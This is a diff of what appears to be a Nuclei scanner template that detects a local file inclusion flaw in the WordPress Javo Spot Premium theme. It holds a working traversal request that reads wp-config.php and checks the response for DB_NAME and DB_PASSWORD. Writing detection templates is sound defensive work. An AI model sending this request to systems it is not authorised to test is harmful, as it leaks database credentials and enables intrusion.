@@ -1,5 +1,4 @@
 id: wp-javospot-lfi
-
 info:
   name: WordPress Javo Spot Premium Theme - Local File Inclusion
   author: 0x_Akoko
@@ -13,15 +12,11 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
-  metadata:
-    max-request: 1
-  tags: wordpress,wp-theme,lfi,wp,wpscan,vuln
-
-http:
+  tags: wordpress,wp-theme,lfi,wp
+requests:
   - method: GET
     path:
       - '{{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery'
-
     matchers-condition: and
     matchers:
       - type: word
@@ -30,8 +25,8 @@ http:
           - "DB_NAME"
           - "DB_PASSWORD"
         condition: and
-
       - type: status
         status:
           - 200
-# digest: 4b0a004830460221009018aa4a8533318f97b9c211db003abf8ab5ecc6e1129a86480b852752ebfae4022100c30ddb0412ed93fe1293c3f0d355f3b2326fe13007bdf29cd0c8f7ac1a3fbdb3:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/07/29
